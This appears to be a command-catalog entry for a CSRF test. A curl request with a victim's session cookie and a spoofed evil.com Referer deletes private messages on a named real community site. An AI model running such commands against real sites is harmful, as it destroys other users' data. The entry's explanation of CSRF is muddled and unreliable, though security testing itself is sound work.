---
data: >-
  curl -X GET "https://community.informatica.com/pm-delete.jspa?messageID=123"
  -H "Cookie: JSESSIONID=your_session_cookie" -v
tags:
  - web
  - test
  - csrf
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:15.401Z'
id: 71356923-e7b3-4706-bab9-30070f118e77
verified: false
validated: true
submitted: true
---
# curl-test-csrf-endpoint

## Command

```bash
curl -X GET "https://community.informatica.com/pm-delete.jspa?messageID=123" -H "Cookie: JSESSIONID=your_session_cookie" -v
```

## Description

This command tests the CSRF vulnerability by sending a forged GET request to the deletion endpoint, simulating a cross-site attack to verify if it performs the action without protections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `messageID=123` | Target message ID to delete | Yes |
| `-H "Cookie: ..."` | Victim's session cookie | Yes |
| `-v` | Verbose output for headers/response | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://community.informatica.com/pm-delete.jspa?messageID=123" -H "Cookie: JSESSIONID=abc123"
```

### Advanced Usage

```bash
curl -X GET "https://community.informatica.com/pm-delete.jspa?messageID=123" -H "Cookie: JSESSIONID=abc123" -H "Referer: http://evil.com" -v
```

## Expected Output

HTTP/1.1 200 OK or 302 Found, indicating successful deletion; no errors about CSRF or origin.

## Related

- [[Related Procedure: Identify-CSRF-Vulnerable-Endpoint-for-Private-Messages]]
